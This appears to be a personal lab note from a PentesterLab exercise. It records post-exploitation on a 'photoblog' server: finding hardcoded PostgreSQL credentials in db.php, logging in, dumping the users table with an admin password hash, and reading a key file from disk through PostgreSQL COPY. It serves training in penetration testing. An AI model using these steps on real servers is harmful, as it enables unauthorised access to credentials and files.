*postgres:postgres*

```
psql --help
```

![[Pasted image 20230906172856.png]]

```
help
```

![[Pasted image 20230906173537.png]]

```
pentesterlab@2bf4791ac123:/var/www/admin$ find / -name db.php 2>/dev/null
/var/www/classes/db.php

pentesterlab@2bf4791ac123:/var/www/admin$ more /var/www/classes/db.php 
<?php 
	$lnk = pg_connect("host=localhost port=5432 dbname=photoblog user=photoblog password=photoblog" );
?>

pentesterlab@2bf4791ac123:/var/www/admin$
```

```
pentesterlab@2bf4791ac123:/var/www/admin$ psql -U photoblog -W photoblogPassword for user photoblog: psql (9.4.26)Type "help" for help.photoblog=# \list List of databases Name | Owner | Encoding | Collate | Ctype | Access privileges -----------+----------+-----------+---------+-------+------------------------ photoblog | postgres | SQL_ASCII | C | C | =Tc/postgres + | | | | | postgres=CTc/postgres + | | | | | photoblog=CTc/postgres postgres | postgres | SQL_ASCII | C | C | template0 | postgres | SQL_ASCII | C | C | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | SQL_ASCII | C | C | =c/postgres + | | | | | postgres=CTc/postgres(4 rows)photoblog=# \c photoblog Password for user photoblog: You are now connected to database "photoblog" as user "photoblog".photoblog=# \d List of relations Schema | Name | Type | Owner --------+-------------------+----------+---------- public | categories | table | postgres public | categories_id_seq | sequence | postgres public | pictures | table | postgres public | pictures_id_seq | sequence | postgres public | users | table | postgres public | users_id_seq | sequence | postgres(6 rows)photoblog=# select * from users; id | login | password ----+-------+---------------------------------- 1 | admin | 8efe310f9ab3efeae8d410a8e0166eb2(1 row)photoblog=#
```

```
photoblog=# create table demo(t text);CREATE TABLEphotoblog=# \d List of relations Schema | Name | Type | Owner --------+-------------------+----------+----------- public | categories | table | postgres public | categories_id_seq | sequence | postgres public | demo | table | photoblog public | pictures | table | postgres public | pictures_id_seq | sequence | postgres public | users | table | postgres public | users_id_seq | sequence | postgres(7 rows)photoblog=# copy demo from '/var/lib/postgresql/9.4/key.txt';COPY 1photoblog=# select * from demo; t -------------------------------------- 25eb9d43-416e-4d3e-9dd3-a7a707380bdb(1 row)photoblog=#
```

